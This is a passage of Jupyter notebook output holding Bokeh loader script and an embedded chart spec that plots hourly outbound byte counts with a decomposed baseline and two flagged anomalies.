inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.3.0.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.3.0.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.3.0.min.js\"];\n  var css_urls = [];\n  \n\n  var inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (var i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      var cell = $(document.getElementById(\"1002\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"ceb2ceec-130f-401c-a23a-29a7e769e223\" data-root-id=\"1153\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  var docs_json = {\"88462ba9-12be-4abc-b086-b2c8219a3425\":{\"defs\":[{\"extends\":null,\"module\":null,\"name\":\"DataModel\",\"overrides\":[],\"properties\":[]}],\"roots\":{\"references\":[{\"attributes\":{\"children\":[{\"id\":\"1005\"},{\"id\":\"1123\"}]},\"id\":\"1153\",\"type\":\"Column\"},{\"attributes\":{\"data\":{\"TimeGenerated\":{\"__ndarray__\":\"AADAwRYyd0IAAKgwGjJ3QgAAkJ8dMndCAAB4DiEyd0IAAGB9JDJ3QgAASOwnMndCAAAwWysyd0IAABjKLjJ3QgAAADkyMndCAADopzUyd0IAANAWOTJ3QgAAuIU8MndCAACg9D8yd0IAAIhjQzJ3QgAAcNJGMndCAABYQUoyd0IAAECwTTJ3QgAAKB9RMndCAAAQjlQyd0IAAPj8VzJ3QgAA4GtbMndCAADI2l4yd0IAALBJYjJ3QgAAmLhlMndCAACAJ2kyd0IAAGiWbDJ3QgAAUAVwMndCAAA4dHMyd0IAACDjdjJ3QgAACFJ6MndCAADwwH0yd0IAANgvgTJ3QgAAwJ6EMndCAACoDYgyd0IAAJB8izJ3QgAAeOuOMndCAABgWpIyd0IAAEjJlTJ3QgAAMDiZMndCAAAYp5wyd0IAAAAWoDJ3QgAA6ISjMndCAADQ86Yyd0IAALhiqjJ3QgAAoNGtMndCAACIQLEyd0IAAHCvtDJ3QgAAWB64MndCAABAjbsyd0IAACj8vjJ3QgAAEGvCMndCAAD42cUyd0IAAOBIyTJ3QgAAyLfMMndCAACwJtAyd0IAAJiV0zJ3QgAAgATXMndCAABoc9oyd0IAAFDi3TJ3QgAAOFHhMndCAAAgwOQyd0IAAAgv6DJ3QgAA8J3rMndCAADYDO8yd0IAAMB78jJ3QgAAqOr1MndCAACQWfkyd0IAAHjI/DJ3QgAAYDcAM3dCAABIpgMzd0IAADAVBzN3QgAAGIQKM3dCAAAA8w0zd0IAAOhhETN3QgAA0NAUM3dCAAC4Pxgzd0IAAKCuGzN3QgAAiB0fM3dCAABwjCIzd0IAAFj7JTN3QgAAQGopM3dCAAAo2Swzd0IAABBIMDN3QgAA+LYzM3dCAADgJTczd0IAAMiUOjN3QgAAsAM+M3dCAACYckEzd0IAAIDhRDN3QgAAaFBIM3dCAABQv0szd0IAADguTzN3QgAAIJ1SM3dCAAAIDFYzd0IAAPB6WTN3QgAA2OlcM3dCAADAWGAzd0IAAKjHYzN3QgAAkDZnM3dCAAB4pWozd0IAAGAUbjN3QgAASINxM3dCAAAw8nQzd0IAABhheDN3QgAAANB7M3dCAADoPn8zd0IAANCtgjN3QgAAuByGM3dCAACgi4kzd0IAAIj6jDN3QgAAcGmQM3dCAABY2JMzd0IAAEBHlzN3QgAAKLaaM3dCAAAQJZ4zd0IAAPiToTN3QgAA4AKlM3dCAADIcagzd0IAALDgqzN3QgAAmE+vM3dCAACAvrIzd0IAAGgttjN3QgAAUJy5M3dCAAA4C70zd0IAACB6wDN3QgAACOnDM3dCAADwV8czd0IAANjGyjN3QgAAwDXOM3dCAACopNEzd0IAAJAT1TN3QgAAeILYM3dCAABg8dszd0IAAEhg3zN3QgAAMM/iM3dCAAAYPuYzd0IAAACt6TN3QgAA6BvtM3dCAADQivAzd0IAALj58zN3QgAAoGj3M3dCAACI1/ozd0IAAHBG/jN3QgAAWLUBNHdCAABAJAU0d0IAACiTCDR3QgAAEAIMNHdCAAD4cA80d0IAAODfEjR3QgAAyE4WNHdCAACwvRk0d0IAAJgsHTR3QgAAgJsgNHdCAABoCiQ0d0IAAFB5JzR3QgAAOOgqNHdCAAAgVy40d0IAAAjGMTR3QgAA8DQ1NHdCAADYozg0d0IAAMASPDR3QgAAqIE/NHdCAACQ8EI0d0IAAHhfRjR3QgAAYM5JNHdCAABIPU00d0IAADCsUDR3QgAAGBtUNHdC\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"TotalBytesSent\":[10823,14821,13532,11947,11193,13257,13375,27975,31501,28775,31398,32979,32241,33539,28420,25757,30947,27803,29637,29670,11563,13465,13587,14967,12964,13858,13119,13907,12739,11227,11268,31322,26683,32982,32544,31414,28254,29893,31290,28334,26328,26448,30576,30793,10484,14995,11715,11296,10487,10789,14758,10998,10682,14572,13689,34167,27286,33955,33700,26810,30679,31533,33739,32815,26046,27499,33974,29118,12821,12836,13819,14877,14220,10053,14690,13161,14334,12806,11771,25544,27355,33777,27055,27816,32648,25686,32147,33363,28923,31547,33575,26369,14754,10415,10286,12086,11414,14915,14479,14063,13211,12485,14759,26964,31469,26214,33556,32596,25150,31064,25338,25714,26089,25673,48616,45856,11654,13127,12184,14179,13841,11097,13724,10535,10022,12570,14145,18473,19477,19080,17622,18725,17612,19733,19338,18656,17732,17801,16167,16485,11455,10545,13991,10699,12735,12639,14501,12477,11497,10081,11729,18121,17458,18104,16508,17814,16494,17588,18545,19534,16085,15276,15363,18166,13830,13350,11842,11111],\"anomalies\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],\"baseline\":[11187,14007,13280,12238,11314,12641,12350,30664,29442,31531,32547,32060,31540,32721,30726,27678,29255,27470,28928,28791,10907,13894,12754,13436,11796,13334,13807,12503,11862,12800,12552,29979,28690,31444,31693,30566,30470,31010,30430,28406,28016,27368,31130,29511,11469,13234,12458,13336,12055,12579,14104,12723,12402,13021,13045,29441,28468,31613,31518,30080,30103,30386,30901,29854,27887,28203,34349,31499,12950,13611,13072,13965,12753,12328,14733,12960,12805,13258,13457,28209,27735,30514,30198,28394,28438,28562,29639,29520,26364,27468,35919,32037,13313,12912,13020,14080,14269,13789,16208,14404,14225,14694,15656,26848,27373,28686,28393,27900,27131,27913,28314,28378,25707,26105,32232,29906,14825,13953,14045,13866,14136,13332,15009,12709,11857,11592,12842,20300,21208,20687,20314,20820,18816,20331,19942,20270,18209,18082,22571,22484,11144,10574,10923,10288,11477,11094,12823,10765,9983,9851,12111,16511,18096,16513,16469,18378,15622,18256,17387,18026,16531,15796,17900,20157,13089,12694,13044,11487],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167],\"residual\":[-364,813,251,-291,-121,615,1024,-2689,2058,-2756,-1149,918,700,817,-2306,-1921,1691,332,708,878,655,-429,832,1530,1167,523,-688,1403,876,-1573,-1284,1342,-2007,1537,850,847,-2216,-1117,859,-72,-1688,-920,-554,1281,-985,1760,-743,-2040,-1568,-1790,653,-1725,-1720,1550,643,4725,-1182,2341,2181,-3270,575,1146,2837,2960,-1841,-704,-375,-2381,-129,-775,746,911,1466,-2275,-43,200,1528,-452,-1686,-2665,-380,3262,-3143,-578,4209,-2876,2507,3842,2558,4078,-2344,-5668,1440,-2497,-2734,-1994,-2855,1125,-1729,-341,-1014,-2209,-897,115,4095,-2472,5162,4695,-1981,3150,-2976,-2664,381,-432,16383,15949,-3171,-826,-1861,312,-295,-2235,-1285,-2174,-1835,977,1302,-1827,-1731,-1607,-2692,-2095,-1204,-598,-604,-1614,-477,-281,-6404,-5999,310,-29,3067,410,1257,1544,1677,1711,1513,229,-382,1609,-638,1590,38,-564,871,-668,1157,1507,-446,-520,-2537,-1991,740,655,-1202,-376],\"score\":{\"__ndarray__\":\"wXsqBZ0ywr+h30T8qIXTPy3+xdGRbLc/Qy/71X1Lvb/w3KS70YSpvwZYxigsas0/H8eTFymn2D/p2TyNrWjwvwJVXrD35eg/q6FE3vLQ8L99K6a3BjDcv3UMLTlME9Y/HERoszjG0D/6Fj+Cj57TPyOaTsw+Key/nvKk3Oh6578FqiduqG/kPy+B8TWCTb8/zbJcvwX40D8A42b9ShrVP/GqUqAuXM8/foJuB+Fbxb+GZqn47/vTPy8Q3CWJeuI/vQFFTVoh3D8eZtAVwPDIP+PAwOY++tC/kuH3lj3v4D9Ux2m61w3VPxOLoBi9P+O/afdi4Wp437+P+2PZXzHgP5XF5vyWhui/nQAX21KQ4j+UX49T/WvUPxK2E29QWdQ/f6sPaR0R67+5cNSH0mjbvxtcAgEEpNQ/G1q34yT5n7+rZo3erqXkv/JKcUF5nta/mwUFvShwy78YK6A3BOfeP1BOk0IbM9i/Yce1sWxG5T/kOfGYoFDSv+PpjuVN7ei/eyjkBC0w479UqMMKKuPlv5hzWBpIQ88/paYyCtkY5b8NRHb2SAnlv42azXTJuOI/3l51fMfGzj/1E4s0lan8Pxh09oh0/dy/3brRc9JW7D/zZ0X8z2TqP6fTSm7g8PO/HAU6sSl4yz8sX+MNoJ7bPyeRNXNTL/E/oBopmb/u8T8oyd6g54Hmv0Weqf7YXdG/KKwK5pC7wr8BYVj0rxLtv3lSSBs6E6u/qfTCyNQX07+WwCW4k+TRP5ort86459U/a1UK9lSz4T+sAyWFwcjrv/1FVi6wsJS/ivfsIKV2sj9Zgl2ET3TiP/j+Kww8esa/1dgOPXWf5L/khkXEU0Pwv4U2/DTR+cK/R+/7ub7E8z9ZvNimOivzv8GdvwT3msy/DpvF04qG+T/DQBnLs4vxv0q32c+BW+4/kEWqMmNL9z8f2PRlP/ruP+r11Gqruvg/ByGzyIWf7L9O/RMPa0IBwIshncJnYuE/hYMEi7577r+SlQzmta7wv6YrMGMgXui/H9hAOwVr8b+bvIHO5RvbP1HCL01MJeW/R/9sAEIUwb+RX+mNoufYvxK71LNT++q/tYwSv0sP1r9ILrFJNWSkP7jQLlkg1fg/kJZWKO4t7r+XG81frVH/Py/sVfnkevw/tpF5yak16L/bayQQcRbzP60adZBUJ/K/buPlW8VB8L+QDGvt0AjCP4PVZdA6gcW/lDb1kSziGEBDb2xVUTkYQDSdThHOVvO/UTb59E9V1L+GU9DvJ8Dmv0QuZb5/W70/pQzk7Revvb/x7kHnQEzrvz+F4YKkft+/7giuKWOO6r+mH2O8Om/mv8+8V3GUgtc/qc0Bd75p3z9N6Gg2VFbmvydQru6FK+W/S/YH0pCp479JxFvGWG3wv2Qmp75+mOm/f6TWaWiG3b83x4VA+JPNv0BtdNKr3s2/uOZCh1q/47/LsuOWfbHHv84FNZp8Ury/QvaOGCF/A8DJKeiI+0MCwJO/cLKyKb0/P1U0v4V8jr/AbCI5RZXyPxQvF4TfccM/Bd/CE51R3j8K8VGQHKbiPyrJsQMVROQ/YjQZveit5D+TWihJn0XiP5E8RU7CSLU/3W32urcSw7+68uKQbXDjPyEaErj6hc+/R6+wEko14z8cjK/EIqaFP1Ya6Fqp7Mu/JQLxkrfu1D8prN1Ivn3Qv193U/4Z49s/EbGsZPIy4j/uWD16iC/Gv7pYZ9fZyMm/P5jnKD/47r/kVvLwyVTov5JtLu85v9E/8apSoC5czz/SiNkm9Xndv9THBykEyMK/\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"seasonal\":[-10756,-7953,-8697,-9756,-10696,-9384,-9691,8607,7371,9446,10451,9953,9422,10593,8591,5536,7107,5316,6769,6628,-11261,-8280,-9428,-8756,-10385,-8835,-8347,-9634,-10254,-9288,-9505,7958,6710,9506,9796,8706,8644,9210,8648,6634,6245,5590,9335,7690,-10386,-8661,-9482,-8650,-9974,-9493,-8009,-9429,-9788,-9206,-9218,7140,6131,9240,9113,7648,7648,7913,8416,7361,5392,5710,11862,9021,-9516,-8842,-9364,-8452,-9641,-10039,-7602,-9339,-9454,-8958,-8714,6084,5661,8490,8223,6463,6546,6699,7796,7686,4528,5618,14048,10140,-8612,-9048,-8988,-7986,-7865,-8418,-6074,-7950,-8193,-7776,-6853,4315,4832,6151,5880,5424,4709,5565,6062,6248,3727,4303,10633,8532,-6302,-6906,-6524,-6391,-5789,-6245,-4208,-6142,-6629,-6534,-4936,2855,4081,3858,3764,4527,2756,4475,4259,4727,2775,2730,7286,7253,-4041,-4576,-4198,-4811,-3607,-3979,-2234,-4275,-5042,-5159,-2886,1527,3124,1555,1525,3449,709,3359,2509,3168,1695,982,3111,5395,-1643,-2008,-1625,-3149],\"trend\":[21943,21961,21977,21994,22010,22026,22042,22056,22070,22084,22096,22107,22117,22127,22135,22142,22148,22154,22158,22163,22168,22174,22182,22193,22181,22169,22155,22137,22116,22089,22058,22021,21980,21938,21897,21859,21826,21799,21781,21771,21770,21777,21795,21821,21855,21896,21941,21986,22030,22073,22114,22153,22191,22227,22264,22300,22337,22372,22404,22432,22455,22473,22485,22492,22495,22493,22487,22477,22466,22453,22437,22417,22394,22367,22335,22299,22259,22217,22172,22124,22074,22024,21975,21930,21892,21863,21843,21834,21836,21849,21870,21896,21925,21961,22008,22066,22134,22208,22283,22355,22418,22471,22509,22533,22541,22534,22512,22475,22421,22348,22252,22129,21979,21801,21598,21373,21128,20860,20570,20257,19925,19577,19217,18852,18486,18127,17778,17444,17127,16828,16549,16292,16060,15855,15682,15542,15434,15351,15285,15231,15186,15150,15121,15100,15085,15074,15058,15041,15025,15011,14997,14984,14971,14957,14943,14929,14913,14896,14877,14858,14836,14813,14788,14761,14733,14702,14670,14636],\"weights\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"1051\"},\"selection_policy\":{\"id\":\"1052\"}},\"id\":\"1003\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.2},\"fill_color\":{\"value\":\"firebrick\"},\"line_color\":{\"value\":\"firebrick\"},\"marker\":{\"value\":\"circle_x\"},\"size\":{\"value\":12},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"1096\",\"type\":\"Scatter\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"1058\",\"type\":\"DaysTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"1043\",\"type\":\"Circle\"},{\"attributes\":{\"source\":{\"id\":\"1094\"}},\"id\":\"1099\",\"type\":\"CDSView\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"1057\",\"type\":\"DaysTicker\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"1060\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"1063\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"source\":{\"id\":\"1003\"}},\"id\":\"1045\",\"type\":\"CDSView\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"firebrick\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"firebrick\"},\"marker\":{\"value\":\"circle_x\"},\"size\":{\"value\":12},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"1097\",\"type\":\"Scatter\"},{\"attributes\":{\"label\":{\"value\":\"anomalies\"},\"renderers\":[{\"id\":\"1098\"}]},\"id\":\"1122\",\"type\":\"LegendItem\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"1061\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"1062\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"click_policy\":\"hide\",\"items\":[{\"id\":\"1067\"},{\"id\":\"1093\"},{\"id\":\"1122\"}],\"location\":\"top_left\"},\"id\":\"1066\",\"type\":\"Legend\"},{\"attributes\":{},\"id\":\"1064\",\"type\":\"YearsTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"1003\"},\"glyph\":{\"id\":\"1042\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1043\"},\"view\":{\"id\":\"1045\"}},\"id\":\"1044\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"end\":1594624860000.0,\"start\":1593963540000.0},\"id\":\"1008\",\"type\":\"Range1d\"},{\"attributes\":{\"below\":[{\"id\":\"1016\"}],\"center\":[{\"id\":\"1019\"},{\"id\":\"1023\"},{\"id\":\"1066\"}],\"height\":300,\"left\":[{\"id\":\"1020\"}],\"min_border_left\":50,\"renderers\":[{\"id\":\"1044\"},{\"id\":\"1071\"},{\"id\":\"1098\"}],\"title\":{\"id\":\"1006\"},\"toolbar\":{\"id\":\"1030\"},\"toolbar_location\":\"above\",\"width\":1200,\"x_range\":{\"id\":\"1008\"},\"x_scale\":{\"id\":\"1012\"},\"y_range\":{\"id\":\"1010\"},\"y_scale\":{\"id\":\"1014\"}},\"id\":\"1005\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"label\":{\"value\":\"observed\"},\"renderers\":[{\"id\":\"1044\"}]},\"id\":\"1067\",\"type\":\"LegendItem\"},{\"attributes\":{\"text\":\"Time Series Anomalies Visualization\"},\"id\":\"1006\",\"type\":\"Title\"},{\"attributes\":{},\"id\":\"1161\",\"type\":\"AllLabels\"},{\"attributes\":{\"format\":\"00\"},\"id\":\"1039\",\"type\":\"NumeralTickFormatter\"},{\"attributes\":{},\"id\":\"1014\",\"type\":\"LinearScale\"},{\"attributes\":{},\"id\":\"1048\",\"type\":\"AllLabels\"},{\"attributes\":{},\"id\":\"1010\",\"type\":\"DataRange1d\"},{\"attributes\":{\"axis_label\":\"TimeGenerated\",\"formatter\":{\"id\":\"1037\"},\"major_label_policy\":{\"id\":\"1050\"},\"ticker\":{\"id\":\"1017\"}},\"id\":\"1016\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"axis_label\":\"TotalBytesSent\",\"formatter\":{\"id\":\"1039\"},\"major_label_policy\":{\"id\":\"1048\"},\"ticker\":{\"id\":\"1021\"}},\"id\":\"1020\",\"type\":\"LinearAxis\"},{\"attributes\":{\"data_source\":{\"id\":\"1094\"},\"glyph\":{\"id\":\"1096\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1097\"},\"view\":{\"id\":\"1099\"}},\"id\":\"1098\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"1012\",\"type\":\"LinearScale\"},{\"attributes\":{\"axis\":{\"id\":\"1016\"},\"grid_line_color\":null,\"ticker\":null},\"id\":\"1019\",\"type\":\"Grid\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"1053\"},{\"id\":\"1054\"},{\"id\":\"1055\"},{\"id\":\"1056\"},{\"id\":\"1057\"},{\"id\":\"1058\"},{\"id\":\"1059\"},{\"id\":\"1060\"},{\"id\":\"1061\"},{\"id\":\"1062\"},{\"id\":\"1063\"},{\"id\":\"1064\"}]},\"id\":\"1017\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"@TimeGenerated\":\"datetime\"},\"tooltips\":[[\"TimeGenerated\",\"@TimeGenerated{%F %T.%3N}\"],[\"TotalBytesSent\",\"@TotalBytesSent\"],[\"residual\",\"@residual\"],[\"trend\",\"@trend\"],[\"seasonal\",\"@seasonal\"],[\"weights\",\"@weights\"],[\"baseline\",\"@baseline\"],[\"score\",\"@score\"]]},\"id\":\"1004\",\"type\":\"HoverTool\"},{\"attributes\":{\"axis\":{\"id\":\"1020\"},\"dimension\":1,\"grid_line_color\":null,\"ticker\":null},\"id\":\"1023\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"1021\",\"type\":\"BasicTicker\"},{\"attributes\":{},\"id\":\"1107\",\"type\":\"Selection\"},{\"attributes\":{},\"id\":\"1026\",\"type\":\"ResetTool\"},{\"attributes\":{},\"id\":\"1050\",\"type\":\"AllLabels\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"1024\",\"type\":\"WheelZoomTool\"},{\"attributes\":{},\"id\":\"1108\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"overlay\":{\"id\":\"1029\"}},\"id\":\"1025\",\"type\":\"BoxZoomTool\"},{\"attributes\":{},\"id\":\"1027\",\"type\":\"SaveTool\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"1028\",\"type\":\"PanTool\"},{\"attributes\":{\"align\":\"right\",\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":\"10px\"},\"id\":\"1139\",\"type\":\"Title\"},{\"attributes\":{\"formatter\":{\"id\":\"1140\"},\"major_label_policy\":{\"id\":\"1161\"},\"ticker\":{\"id\":\"1135\"}},\"id\":\"1134\",\"type\":\"DatetimeAxis\"},{\"attributes\":{},\"id\":\"1179\",\"type\":\"Selection\"},{\"attributes\":{\"text\":\"Range Selector\"},\"id\":\"1124\",\"type\":\"Title\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":0.5,\"fill_color\":\"lightgrey\",\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[4,4],\"line_width\":2,\"right_units\":\"screen\",\"syncable\":false,\"top_units\":\"screen\"},\"id\":\"1029\",\"type\":\"BoxAnnotation\"},{\"attributes\":{},\"id\":\"1128\",\"type\":\"DataRange1d\"},{\"attributes\":{\"below\":[{\"id\":\"1134\"},{\"id\":\"1139\"}],\"center\":[{\"id\":\"1137\"}],\"height\":120,\"renderers\":[{\"id\":\"1146\"}],\"title\":{\"id\":\"1124\"},\"toolbar\":{\"id\":\"1138\"},\"toolbar_location\":null,\"width\":1200,\"x_range\":{\"id\":\"1126\"},\"x_scale\":{\"id\":\"1130\"},\"y_range\":{\"id\":\"1128\"},\"y_scale\":{\"id\":\"1132\"}},\"id\":\"1123\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"end\":1594684980000.0,\"start\":1593903420000.0},\"id\":\"1126\",\"type\":\"Range1d\"},{\"attributes\":{},\"id\":\"1130\",\"type\":\"LinearScale\"},{\"attributes\":{},\"id\":\"1132\",\"type\":\"LinearScale\"},{\"attributes\":{},\"id\":\"1180\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"1037\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"id\":\"1181\"},{\"id\":\"1182\"},{\"id\":\"1183\"},{\"id\":\"1184\"},{\"id\":\"1185\"},{\"id\":\"1186\"},{\"id\":\"1187\"},{\"id\":\"1188\"},{\"id\":\"1189\"},{\"id\":\"1190\"},{\"id\":\"1191\"},{\"id\":\"1192\"}]},\"id\":\"1135\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"axis\":{\"id\":\"1134\"},\"ticker\":null},\"id\":\"1137\",\"type\":\"Grid\"},{\"attributes\":{\"data_source\":{\"id\":\"1003\"},\"glyph\":{\"id\":\"1069\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1070\"},\"view\":{\"id\":\"1072\"}},\"id\":\"1071\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"blue\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"blue\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"score\"}},\"id\":\"1145\",\"type\":\"Circle\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"1181\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"active_multi\":{\"id\":\"1148\"},\"tools\":[{\"id\":\"1148\"}]},\"id\":\"1138\",\"type\":\"Toolbar\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"1182\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"1184\",\"type\":\"DaysTicker\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"1183\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"source\":{\"id\":\"1003\"}},\"id\":\"1072\",\"type\":\"CDSView\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"1188\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"fill_alpha\":0.2,\"fill_color\":\"navy\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[2,2],\"line_width\":0.5,\"syncable\":false},\"id\":\"1149\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"green\",\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"baseline\"}},\"id\":\"1070\",\"type\":\"Line\"},{\"attributes\":{\"source\":{\"id\":\"1142\"}},\"id\":\"1147\",\"type\":\"CDSView\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"1189\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"1185\",\"type\":\"DaysTicker\"},{\"attributes\":{\"line_color\":\"green\",\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"baseline\"}},\"id\":\"1069\",\"type\":\"Line\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"1187\",\"type\":\"DaysTicker\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"1191\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"data\":{\"TimeGenerated\":{\"__ndarray__\":\"AAAQJZ4zd0IAAPiToTN3Qg==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[2]},\"TotalBytesSent\":[48616,45856],\"baseline\":[32232,29906],\"index\":[114,115],\"level_0\":[0,1],\"residual\":[16383,15